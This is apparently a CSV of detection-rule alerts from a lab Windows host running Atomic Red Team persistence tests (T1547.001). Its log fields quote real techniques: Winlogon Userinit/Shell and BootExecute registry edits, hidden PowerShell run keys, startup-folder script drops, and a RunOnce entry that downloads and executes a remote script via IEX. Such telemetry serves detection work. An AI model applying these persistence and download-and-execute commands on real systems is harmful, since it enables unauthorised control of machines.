"2025-12-26 11:19:16.858 +01:00","CurrentVersion NT Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173632,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit ¦ Details: C:\WINDOWS\system32\userinit.exe, C:\Windows\System32\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6056 ¦ PGUID: E9F06A57-6124-694E-9601-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: - ¦ UtcTime: 2025-12-26 10:19:16.855","registry_set_asep_reg_keys_modification_currentversion_nt.yml","5800ac7d-6494-f095-585d-e83af10a41f5","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.548 +01:00","CurrentVersion NT Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173635,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell-backup ¦ Details: explorer.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060 ¦ UtcTime: 2025-12-26 10:19:17.545","registry_set_asep_reg_keys_modification_currentversion_nt.yml","5800ac7d-6494-f095-585d-e83af10a41f5","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.557 +01:00","CurrentVersion NT Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173636,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell ¦ Details: explorer.exe, C:\Windows\explorer.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060 ¦ UtcTime: 2025-12-26 10:19:17.554","registry_set_asep_reg_keys_modification_currentversion_nt.yml","5800ac7d-6494-f095-585d-e83af10a41f5","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.897 +01:00","Session Manager Autorun Keys Modification","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001 ¦ T1546.009","sysmon",173644,"EventType: SetValue ¦ RegKey: HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute ¦ Details: Binary Data ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1456 ¦ PGUID: E9F06A57-6126-694E-9E01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: - ¦ UtcTime: 2025-12-26 10:19:18.895","registry_set_asep_reg_keys_modification_session_manager.yml","01d511cf-919d-faa8-d5b6-c1f16e9b6c5c","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:53.681 +01:00","Suspicious PowerShell In Registry Run Keys","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173567,"EventType: SetValue ¦ RegKey: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun ¦ Details: powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")"" ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:18:53.680","registry_set_powershell_in_run_keys.yml","6bbec0c9-86cd-b433-ee4b-e9eeff1b185b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.893 +01:00","Suspicious PowerShell In Registry Run Keys","med","DESKTOP-G2OBL3D","Sysmon",13,"PrivEsc ¦ Persis","T1547.001","sysmon",173615,"EventType: SetValue ¦ RegKey: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Run\socks5_powershell ¦ Details: powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8680 ¦ PGUID: E9F06A57-611B-694E-8C01-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1060,RunKey ¦ UtcTime: 2025-12-26 10:19:07.886","registry_set_powershell_in_run_keys.yml","6bbec0c9-86cd-b433-ee4b-e9eeff1b185b","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:11.854 +01:00","Modify User Shell Folders Startup Value","high","DESKTOP-G2OBL3D","Sysmon",13,"Persis ¦ PrivEsc","T1547.001","sysmon",173622,"EventType: SetValue ¦ RegKey: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Startup ¦ Details: C:\Users\student\AppData\Local\Temp\atomictest\ ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9204 ¦ PGUID: E9F06A57-611F-694E-9001-000000002400 ¦ User: DESKTOP-G2OBL3D\student","RuleName: T1112,ChangeStartupFolderPath ¦ UtcTime: 2025-12-26 10:19:11.849","registry_set_susp_user_shell_folders.yml","eb188ac7-08c6-344c-003a-6645ac5917b4","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.579 +01:00","Potentially Suspicious PowerShell Child Processes","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","detection.threat-hunting ¦ sysmon",173578,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" ""C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8392 ¦ PGUID: E9F06A57-610E-694E-7401-000000002400 ¦ ParentPID: 7868 ¦ ParentPGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:54.571","proc_creation_win_powershell_susp_child_processes.yml","1343a348-60cf-7a2f-8cac-702f5ae8e622","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.858 +01:00","Potentially Suspicious PowerShell Child Processes","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","detection.threat-hunting ¦ sysmon",173579,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1244 ¦ PGUID: E9F06A57-610E-694E-7501-000000002400 ¦ ParentPID: 7868 ¦ ParentPGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:54.844","proc_creation_win_powershell_susp_child_processes.yml","1343a348-60cf-7a2f-8cac-702f5ae8e622","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.829 +01:00","Potentially Suspicious PowerShell Child Processes","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","detection.threat-hunting ¦ sysmon",173590,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" /E:Jscript ""C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8664 ¦ PGUID: E9F06A57-610F-694E-7901-000000002400 ¦ ParentPID: 5496 ¦ ParentPGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:55.818","proc_creation_win_powershell_susp_child_processes.yml","1343a348-60cf-7a2f-8cac-702f5ae8e622","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:56.766 +01:00","Potentially Suspicious PowerShell Child Processes","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","detection.threat-hunting ¦ sysmon",173592,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9072 ¦ PGUID: E9F06A57-6110-694E-7C01-000000002400 ¦ ParentPID: 5496 ¦ ParentPGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:56.747","proc_creation_win_powershell_susp_child_processes.yml","1343a348-60cf-7a2f-8cac-702f5ae8e622","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.579 +01:00","WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.005 ¦ T1059.007","detection.threat-hunting ¦ sysmon",173578,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" ""C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8392 ¦ PGUID: E9F06A57-610E-694E-7401-000000002400 ¦ ParentPID: 7868 ¦ ParentPGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:54.571","proc_creation_win_wscript_cscript_script_exec.yml","5c1582b7-5692-136b-8903-88628ab516a2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.858 +01:00","WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.005 ¦ T1059.007","detection.threat-hunting ¦ sysmon",173579,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1244 ¦ PGUID: E9F06A57-610E-694E-7501-000000002400 ¦ ParentPID: 7868 ¦ ParentPGUID: E9F06A57-610D-694E-7201-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\"""" cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\"""" cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:54.844","proc_creation_win_wscript_cscript_script_exec.yml","5c1582b7-5692-136b-8903-88628ab516a2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.829 +01:00","WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.005 ¦ T1059.007","detection.threat-hunting ¦ sysmon",173590,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" /E:Jscript ""C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8664 ¦ PGUID: E9F06A57-610F-694E-7901-000000002400 ¦ ParentPID: 5496 ¦ ParentPGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:55.818","proc_creation_win_wscript_cscript_script_exec.yml","5c1582b7-5692-136b-8903-88628ab516a2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:56.766 +01:00","WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.005 ¦ T1059.007","detection.threat-hunting ¦ sysmon",173592,"Cmdline: ""C:\WINDOWS\system32\cscript.exe"" /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse"" ¦ Proc: C:\Windows\System32\cscript.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9072 ¦ PGUID: E9F06A57-6110-694E-7C01-000000002400 ¦ ParentPID: 5496 ¦ ParentPGUID: E9F06A57-610F-694E-7601-000000002400 ¦ Description: Microsoft ® Console Based Script Host ¦ Product: Microsoft ® Windows Script Host ¦ Company: Microsoft Corporation ¦ Hashes: MD5=D12B8C23A5360CED9A30EF7532042E6D,SHA256=5084B9867A14F60AA1A46C486C9FEB8ED8C843DC754BD661118C9CE2FC77CDF9,IMPHASH=D2447EDBFB0905AA7192706112935907","CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 5.812.10240.16384 ¦ IntegrityLevel: High ¦ OriginalFileName: cscript.exe ¦ ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\"""" cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\"""" cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:56.747","proc_creation_win_wscript_cscript_script_exec.yml","5c1582b7-5692-136b-8903-88628ab516a2","C:\Tools\Logs\art_1547_001.evtx"
